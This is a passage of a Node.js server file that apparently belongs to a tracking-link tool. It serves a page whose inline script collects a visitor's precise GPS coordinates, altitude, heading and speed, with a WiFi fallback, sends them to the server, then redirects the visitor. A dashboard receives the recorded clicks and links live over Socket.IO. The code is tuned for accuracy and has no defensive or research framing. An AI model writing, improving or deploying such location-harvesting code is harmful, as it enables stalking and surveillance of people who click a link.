                  }
                });
              } catch (e) {
                try { redirect(); } catch (redErr) {}
              }
            }

            /**
             * IMPROVED: Uses watchPosition with progressive accuracy.
             * The first callback fires quickly with a less accurate position,
             * then subsequent callbacks refine it. We track the best (most accurate)
             * position and send it after a brief collection window.
             */
            try {
              if (navigator.geolocation && typeof navigator.geolocation.getCurrentPosition === "function") {
                // Start watching for progressive accuracy improvement
                watchId = navigator.geolocation.watchPosition(
                  function(position) {
                    // Store the best position (lowest accuracy value = best)
                    if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
                      bestPosition = position;
                    }
                  },
                  function(err) {
                    // GPS error — stop watching, try WiFi fallback
                    if (watchId !== null) {
                      try { navigator.geolocation.clearWatch(watchId); watchId = null; } catch(e) {}
                    }
                    sendWifiLocationTrace();
                  },
                  {
                    enableHighAccuracy: true,
                    timeout: 12000,
                    maximumAge: 0
                  }
                );

                // Quick initial attempt (lower accuracy but fast)
                navigator.geolocation.getCurrentPosition(
                  function(position) {
                    // Got initial fix — send immediately with what we have
                    if (watchId !== null) {
                      try { navigator.geolocation.clearWatch(watchId); watchId = null; } catch(e) {}
                    }
                    const payload = {
                      latitude: position.coords.latitude,
                      longitude: position.coords.longitude,
                      accuracy: position.coords.accuracy,
                      altitude: position.coords.altitude,
                      altitudeAccuracy: position.coords.altitudeAccuracy,
                      heading: position.coords.heading,
                      speed: position.coords.speed
                    };
                    sendTrace(payload);
                  },
                  function() {
                    // Quick fix failed — wait for watchPosition or fall back
                    // Set a timer to use the best position we've collected so far
                    setTimeout(function() {
                      if (bestPosition) {
                        if (watchId !== null) {
                          try { navigator.geolocation.clearWatch(watchId); watchId = null; } catch(e) {}
                        }
                        const pos = bestPosition;
                        const payload = {
                          latitude: pos.coords.latitude,
                          longitude: pos.coords.longitude,
                          accuracy: pos.coords.accuracy,
                          altitude: pos.coords.altitude,
                          altitudeAccuracy: pos.coords.altitudeAccuracy,
                          heading: pos.coords.heading,
                          speed: pos.coords.speed
                        };
                        sendTrace(payload);
                      } else {
                        sendWifiLocationTrace();
                      }
                    }, 3000);
                  },
                  {
                    enableHighAccuracy: false,  // Fast, non-GPS fix first
                    timeout: 5000,
                    maximumAge: 60000
                  }
                );
              } else {
                sendWifiLocationTrace();
              }
            } catch (geoErr) {
              try { sendWifiLocationTrace(); } catch (sendErr) { try { redirect(); } catch (redErr) {} }
            }
          })();
        </script>
      </body>
    </html>
  `);
});

// Vite Server Configuration / Middleware mount
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  // Handle SocketIO connections
  io.on("connection", (socket) => {
    console.log("Dashboard client connected:", socket.id);
    socket.emit("initial_sync", { clicks, links: Array.from(links.values()) });

    socket.on("disconnect", () => {
      console.log("Dashboard client disconnected:", socket.id);
    });
  });

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server fully listening on http://0.0.0.0:${PORT}`);
  });
}

startServer();
